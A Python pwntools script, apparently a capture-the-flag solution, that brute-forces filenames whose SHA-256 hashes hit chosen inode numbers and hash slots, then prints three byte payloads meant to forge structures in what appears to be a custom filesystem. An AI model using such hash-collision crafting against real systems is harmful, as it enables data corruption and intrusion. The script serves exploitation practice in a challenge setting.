

import hashlib
from pwn import *
import random

def random_char():
    return random.randint(0x41, 0x5a) 


## first special file

BASE = b"/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB/"
wanted = BASE + b"z"
payload = list(b"\0\0\x64\x64\x42\0\0\0\x7f\x81\x7f\x7fAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIINNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN\x07")

def valid(p):
    a = hashlib.sha256(p).digest()
    b = hashlib.sha256(wanted).digest()

    a0 = u64(a[:8])
    a1 = u64(a[8:16])
    a2 = u64(a[16:24])
    b0 = u64(b[:8])
    b1 = u64(b[8:16])
    b2 = u64(b[16:24])

    return ((a0 % 6 + 1) == (b0 % 6 + 1)) and a1 & 0x1 == b1 & 1 and a2 & 1 == b2 & 1 


while 1:
    tmp = list(payload)
    for i in range(len(tmp)):
        if tmp[i] == 0:
            tmp[i] = random_char()
    tmp2 = BASE + bytes(tmp)
    if valid(tmp2):
        payload = list(tmp)
        break
        

print("payload0:", ''.join(f'\\x{c:02X}' for c in payload))

## second special file
## we need a filename length 6 that gives ino 0x1000

BASE = b"/"

def valid0(p):
    a = hashlib.sha256(p).digest()

    a0 = u64(a[:8])
    a1 = u64(a[8:16])
    a2 = u64(a[16:24])

    return ((a0 % 6 + 1) == 1) and a1 & 0x3f == 0 and a2 & 0x3f == 0

while 1:
    tmp = list(BASE) + [random_char() for i in range(6)]
    if valid0(bytes(tmp)):
        print("payload1:", ''.join(f'\\x{c:02X}' for c in tmp[1:]))
        break

## third special file
## we need a filename that starts with 0b01110000 and gives has ino 0x2000

def valid2(p):
    a = hashlib.sha256(p).digest()

    a0 = u64(a[:8])
    a1 = u64(a[8:16])
    a2 = u64(a[16:24])

    return ((a0 % 6 + 1) == 2) and a1 & 0x1f == 0 and a2 & 0x1f == 0

BASE =  b"/" + bytes([0b01110000])

while 1:
    tmp = list(BASE) + [random_char() for i in range(10)]
    if valid2(bytes(tmp)):
        print("payload2:", ''.join(f'\\x{c:02X}' for c in tmp[1:]))
        break
